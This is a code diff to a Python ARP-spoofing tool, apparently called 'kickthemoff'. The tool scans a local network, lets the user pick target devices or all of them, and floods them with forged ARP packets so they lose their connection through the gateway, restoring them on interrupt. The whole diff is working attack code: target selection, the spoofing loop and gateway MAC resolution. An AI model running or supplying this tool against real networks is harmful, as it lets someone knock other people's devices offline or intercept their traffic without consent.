@@ -167,17 +167,35 @@ def build_targets(hosts_list):
     return targets
 
 
+def parse_attack_choice(choice):
+    pass
+
 def kicksomeoff():
-    print("\n{0}[*] ARP Scanning network for targets{1}...{2}\n").format(RED, GREEN, END)
-    scanNetwork()
-    
-    print_online_ips()
-   
+    global onlineIPs, defaultGatewayMac
+        
+    #print_online_ips()
+    scanned = False 
     canBreak = False
     while not canBreak:
         try:
-            choice = raw_input("\nEnter device numbers to target (comma-separated), a custom IP, or [a] to target all: ") 
-            if re.match('\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}', choice) != None:
+            if not scanned and onlineIPs:
+                print("[*] Enter "+RED+"device numbers"+END+" to target (comma-separated), a "+RED+"custom IP"+END+" to attack or ["+RED+"s"+END+"] to rescan subet for hosts to attack (default)\n") 
+                print_online_ips()
+                print("")
+            elif not scanned:
+                print("[*] Enter a "+RED+"custom IP"+END+" to attack or ["+RED+"s"+END+"] to scan subet for hosts to attack (default)\n")
+            else:
+                print("[*] Enter "+RED+"device numbers"+END+" to target (comma-separated), a "+RED+"custom IP"+END+", or ["+RED+"a"+END+"] to target all.\n") 
+
+            choice = raw_input(('{0}kickthemoff{1}: {2}'.format(BLUE, WHITE, END)))
+            if choice == "" or choice.lower() == "s":
+                print("\n{0}[*] ARP Scanning network for targets{1}...{2}\n").format(RED, GREEN, END)
+                scanNetwork()
+                scanned = True
+                print_online_ips()
+                print("")
+                continue
+            elif re.match('\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}', choice) != None:
                 targets={}
                 result = sr1(ARP(op=ARP.who_has, psrc=getMyIP(), pdst=choice), timeout=5, verbose=False) 
                 if not result:
@@ -185,6 +203,7 @@ def kicksomeoff():
                     continue
                 mac = result.hwsrc
                 targets[choice] = mac
+                
                 canBreak = True
             elif choice.upper() == "A" or choice.upper() == "ALL":
                 targets = [host[0] for host in hostsList if host[0] != defaultGatewayIP]
@@ -200,7 +219,7 @@ def kicksomeoff():
                     targets = build_targets([onlineIPs[int(choice)]])
                     canBreak = True
                 except:
-                    print("{0}ERROR: Please enter a number.{1}\n").format(RED, END)
+                    print("{0}ERROR: Please enter a valid choice.{1}\n").format(RED, END)
         except KeyboardInterrupt:
             return
 
@@ -210,21 +229,27 @@ def kicksomeoff():
     some_ipList = some_ipList[:-2] + END
 
     print("\n{0}Targets: {1}" + some_ipList).format(GREEN, END)
-    print("\n{0}Spoofing started... {1}").format(GREEN, END)
+    sys.stdout.write("\n{0}Spoofing{1}".format(GREEN, END))
+    sys.stdout.flush()
     try:
         while True:
             for ip in targets:
                 mac = targets[ip]
                 sendPacket(defaultInterfaceMac, defaultGatewayIP, ip, mac)
+            sys.stdout.write(".")
+            sys.stdout.flush()
             time.sleep(1)
     except KeyboardInterrupt:
-        sys.stdout.write("\n{0}Re-arping{1} targets...{2}".format(RED, GREEN, END))
+        sys.stdout.write("\n{0}Re-arping{1} targets{2}".format(RED, GREEN, END))
+        sys.stdout.flush()
         reArp = 1
         while reArp != 10:
             sys.stdout.write(".")
             for ip in targets:
                 sendPacket(defaultGatewayMac, defaultGatewayIP, ip, targets[ip])
             reArp += 1
+            sys.stdout.write(".")
+            sys.stdout.flush()
             time.sleep(0.5)
         print("\n{0}Re-arped{1} targets successfully.{2}").format(RED, GREEN, END)
 
@@ -234,17 +259,36 @@ def getDefaultInterface():
         return i
     except:
         i = [x for x in ni.interfaces() if "lo" not in x][0]
-        print(RED+"ERROR: "+END+" Could not find network interface with a gateway. Defaulting instead to interface "+GREEN+i+END+".")
+        print(RED+"[!]"+END+" Could not find a local default route. Defaulting blindly to interface "+GREEN+i+END+".")
         return i
 
+def getGatewayMac(gateway):
+    result = sr1(ARP(op=ARP.who_has, psrc=getMyIP(), pdst=gateway), timeout=2, verbose=False)
+    if not result:
+        print(RED+"[!]"+END+": The gateway did not respond. (Is it's IP address ("+RED+gateway+END+") correct?)\n"+END)
+        return None
+    return result.hwsrc
+
 def getGatewayIP():
+    global defaultGatewayMac
     try:
         getGateway_p = [x[0] for x in ni.gateways()[2] if x[1] == defaultInterface][0]
+        mac = getGatewayMac(getGateway_p)
+        if not mac:
+            raise Exception
+        defaultGatewayMac = mac
         return getGateway_p
     except:
-        print("\n{0}ERROR: Gateway IP for interface "+GREEN+defaultInterface+RED+" could not be obtained. Please enter IP manually.{1}\n").format(RED, END)
-        header = ('{0}kickthemoff{1}> {2}Enter Gateway IP {3}(e.g. 192.168.1.1): '.format(BLUE, WHITE, RED, END))
-        gatewayIP = raw_input(header)
+        print("{0}[!]{1} Gateway IP for interface "+GREEN+defaultInterface+END+" could not be obtained. Please enter IP manually.\n").format(RED, END)
+
+        can_break = False
+        while not can_break:           
+            header = ('{0}kickthemoff{1}> {2}Enter Gateway IP {3}(e.g. 192.168.1.1): '.format(BLUE, WHITE, RED, END))
+            gatewayIP = raw_input(header)
+            mac = getGatewayMac(gatewayIP)
+            if mac:
+                defaultGatewayMac = mac
+                can_break = True
         return gatewayIP
 
 def getDefaultInterfaceMAC():
@@ -283,15 +327,16 @@ def getMyIP():
     return ni.ifaddresses(defaultInterface)[ni.AF_INET][0]['addr']
 
 def print_info():
-    print("\n{0}Using interface '{1}" + defaultInterface + "{2}' ("+RED+getMyIP()+GREEN+") with mac address '{3}" + defaultInterfaceMac + "{4}' to gateway '{5}"
-        + defaultGatewayIP + "{6}'{9}").format(GREEN, RED, GREEN, RED, GREEN, RED, GREEN, RED, GREEN, END)
+    print("\n{0}Using interface {1}" + defaultInterface + "{2} - "+RED+getMyIP()+GREEN+" ({3}" + defaultInterfaceMac + "{4}) to gateway '{5}"
+        + defaultGatewayIP + "{6}' ("+defaultGatewayMac+"){9}").format(GREEN, RED, GREEN, RED, GREEN, RED, GREEN, RED, GREEN, END)
 
 
 def main():
-    global header
+    global header, onlineIPs
     heading()
     print_info()
-
+    onlineIPs = []
+    defaultGatewayMac = ""
     try:
         while True:
 
